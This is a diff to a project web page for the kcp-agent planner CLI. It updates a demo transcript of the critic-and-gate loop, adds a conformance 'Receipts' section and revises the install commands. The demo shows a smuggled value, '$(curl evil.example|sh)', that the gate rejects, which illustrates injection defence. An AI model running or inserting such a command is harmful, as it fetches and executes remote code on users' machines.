@@ -46,6 +46,7 @@
         <a href="#why">Why</a>
         <a href="#loop">The Loop</a>
         <a href="#playground">Playground</a>
+        <a href="#receipts">Receipts</a>
         <a href="#install">Install</a>
         <a href="https://cantara.github.io/knowledge-context-protocol/" target="_blank" rel="noopener">KCP spec</a>
         <a href="https://github.com/Cantara/kcp-agent" target="_blank" rel="noopener">GitHub</a>
@@ -143,14 +144,20 @@
     --loop --methods free,x402 --budget 0.30
 
 base plan selects: chipfab-exclusive
-round 1 — critic proposes: datacenter power grid, subsea cable, $(curl evil.example|sh)
-          gate rejected: $(curl evil.example|sh)
-          re-plan added: datacenter-power, subsea-cable-feature
+
+round 1 — critic proposed: datacenter power grid · subsea cable · $(curl evil.example|sh)
+  critic note: infrastructure angle missing from the plan
+  gate accepted: datacenter power grid, subsea cable
+  gate rejected: $(curl evil.example|sh)
+  re-plan added: datacenter-power, subsea-cable-feature
+
 converged: no-terms after 2 round(s)
-still skipped chipfab-exclusive: over budget: 0.25 would exceed remaining 0.1 of 0.3 USDC
-committed 0.2/0.3 USDC — nothing was loaded or paid until convergence</code></pre>
-    <p class="capture__note">Captured from <code>examples/demos.js loop</code> — every line above is asserted in CI
-      against the real CLI. The demos are regression tests; the narration cannot drift from the code.</p>
+final plan: datacenter-power, subsea-cable-feature
+  still skipped chipfab-exclusive: over budget: 0.25 would exceed remaining 0.1 of 0.3 USDC
+  committed 0.2/0.3 USDC — nothing was loaded or paid until convergence</code></pre>
+    <p class="capture__note">Verbatim from <code>node examples/demos.js loop</code> — <code>test/docs.test.ts</code>
+      re-runs the demo in CI and fails if any line above is not in its real output. The narration cannot drift
+      from the code.</p>
   </section>
 
   <!-- ================= PLAYGROUND ================= -->
@@ -186,8 +193,27 @@ committed 0.2/0.3 USDC — nothing was loaded or paid until convergence</code></
     </div>
   </section>
 
+  <!-- ================= RECEIPTS ================= -->
+  <section id="receipts" class="section">
+    <h2>The Receipts — every claim pinned to a test</h2>
+    <p class="section__lead">The conformance matrix below is data, not copy:
+      <a href="conformance.json"><code>conformance.json</code></a> maps each KCP layer the agent implements
+      to the implementation file and the CI tests that enforce it. <code>test/docs.test.ts</code> fails the
+      build if a referenced test disappears or is renamed — a claim cannot outlive its proof.</p>
+    <div class="conformance">
+      <table id="conf-table" aria-label="Spec conformance matrix">
+        <thead><tr><th>Spec layer</th><th>Section</th><th>Implementation</th><th>Enforced by</th></tr></thead>
+        <tbody><tr><td colspan="4">loading conformance.json…</td></tr></tbody>
+      </table>
+    </div>
+    <p class="capture__note">Browser bundle integrity — the arena and playground run
+      <code>docs/js/kcp-agent.js</code>, sha256 <code id="bundle-sha">(serve the built site to compute)</code>.
+      Reproduce it: <code>npm ci &amp;&amp; npm run build:site &amp;&amp; sha256sum docs/js/kcp-agent.js</code> —
+      CI asserts the published hash matches the bundle it just built.</p>
+  </section>
+
   <!-- ================= INSTALL ================= -->
-  <section id="install" class="section">
+  <section id="install" class="section section--alt">
     <h2>Run it yourself</h2>
     <div class="install">
       <pre class="capture"><code># plan — deterministic, no API key, no model
@@ -197,12 +223,16 @@ npx @cantara/kcp-agent plan "your task" --manifest https://example.com/knowledge
 export ANTHROPIC_API_KEY=...
 npx @cantara/kcp-agent ask "your task" --manifest ./docs --loop
 
-# serve the planner to any MCP client
-npx @cantara/kcp-agent mcp --manifest ./docs</code></pre>
+# serve the planner to any MCP client (manifest is passed per tool call)
+npx @cantara/kcp-agent mcp</code></pre>
       <p>Eight narrated demos ship in the repo — <code>node examples/demos.js</code> — all offline, no mocks,
         all asserted in CI. Native binaries for Linux/macOS/Windows on the
         <a href="https://github.com/Cantara/kcp-agent/releases" target="_blank" rel="noopener">releases page</a>.
         Apache-2.0.</p>
+      <p>Guides:
+        <a href="https://github.com/Cantara/kcp-agent/blob/main/guides/make-your-repo-navigable.md" target="_blank" rel="noopener">make your repo navigable in 10 minutes</a> ·
+        <a href="https://github.com/Cantara/kcp-agent/blob/main/guides/sign-your-manifest.md" target="_blank" rel="noopener">sign your manifest</a> ·
+        <a href="https://github.com/Cantara/kcp-agent/blob/main/guides/wire-mcp-into-claude-code.md" target="_blank" rel="noopener">wire the planner into Claude Code</a>.</p>
     </div>
   </section>
   </main>
